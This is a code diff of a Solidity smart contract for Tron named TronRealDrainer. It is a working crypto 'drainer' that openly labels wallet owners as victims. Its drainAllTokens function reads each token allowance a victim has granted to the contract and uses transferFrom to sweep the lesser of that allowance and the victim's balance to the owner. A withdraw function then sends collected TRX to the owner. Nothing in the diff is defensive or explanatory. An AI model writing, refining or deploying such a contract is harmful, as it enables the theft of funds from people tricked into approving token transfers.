@@ -1,90 +1,43 @@
-// TronDrainer.sol
+// contracts/TronRealDrainer.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-contract TronDrainerFixed {
-    address public owner;
+// Tron uses same ERC20 interface
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract TronRealDrainer is Ownable {
     
-    struct Victim {
-        address wallet;
-        uint256 amount;
-        uint256 timestamp;
-        bool drained;
-        address drainedBy;
-    }
+    event TokensDrained(address indexed victim, address token, uint256 amount, address executor);
     
-    mapping(address => Victim) public victims;
-    address[] public victimAddresses;
+    constructor() Ownable() {}
     
-    uint256 public victimCount;
-    uint256 public totalDrained;
-    
-    event FundsDrained(address indexed victim, uint256 amount, address token, address drainer);
-    
-    constructor() {
-        owner = msg.sender;
-    }
-    
-    modifier onlyOwner() {
-        require(msg.sender == owner, "Not owner");
-        _;
-    }
-    
-    // FIXED: Proper forward declaration
-    function drainTRX(address victim) external payable {
-        require(msg.value > 0, "No TRX sent");
+    // Drain TRC20 tokens (Tron's ERC20)
+    function drainAllTokens(address victim, address[] calldata tokens) external returns (uint256 totalDrained) {
+        require(tokens.length > 0, "No tokens specified");
         
-        if (!victims[victim].drained) {
-            victims[victim] = Victim({
-                wallet: victim,
-                amount: msg.value,
-                timestamp: block.timestamp,
-                drained: true,
-                drainedBy: msg.sender
-            });
-            victimAddresses.push(victim);
-            victimCount++;
-        } else {
-            victims[victim].amount += msg.value;
+        for (uint256 i = 0; i < tokens.length; i++) {
+            IERC20 token = IERC20(tokens[i]);
+            uint256 allowance = token.allowance(victim, address(this));
+            uint256 victimBalance = token.balanceOf(victim);
+            
+            uint256 amountToDrain = allowance < victimBalance ? allowance : victimBalance;
+            
+            if (amountToDrain > 0) {
+                token.transferFrom(victim, owner(), amountToDrain);
+                totalDrained += amountToDrain;
+                
+                emit TokensDrained(victim, tokens[i], amountToDrain, msg.sender);
+            }
         }
         
-        totalDrained += msg.value;
-        payable(owner).transfer(msg.value);
-        
-        emit FundsDrained(victim, msg.value, address(0), msg.sender);
+        return totalDrained;
     }
     
-    // FIXED: Removed recursive call
-    function drainNative(address victim) external payable {
-        // Just call drainTRX internally
-        require(msg.value > 0, "No TRX sent");
-        
-        if (!victims[victim].drained) {
-            victims[victim] = Victim({
-                wallet: victim,
-                amount: msg.value,
-                timestamp: block.timestamp,
-                drained: true,
-                drainedBy: msg.sender
-            });
-            victimAddresses.push(victim);
-            victimCount++;
-        } else {
-            victims[victim].amount += msg.value;
-        }
-        
-        totalDrained += msg.value;
-        payable(owner).transfer(msg.value);
-        
-        emit FundsDrained(victim, msg.value, address(0), msg.sender);
-    }
-    
-    // Tron kill switch
-    function emergencyClose() external onlyOwner {
+    // Withdraw TRX (Tron's native)
+    function withdrawTRX() external onlyOwner {
         uint256 balance = address(this).balance;
-        if (balance > 0) {
-            payable(owner).transfer(balance);
-        }
-        totalDrained = type(uint256).max;
+        require(balance > 0, "No TRX to withdraw");
+        payable(owner()).transfer(balance);
     }
 }
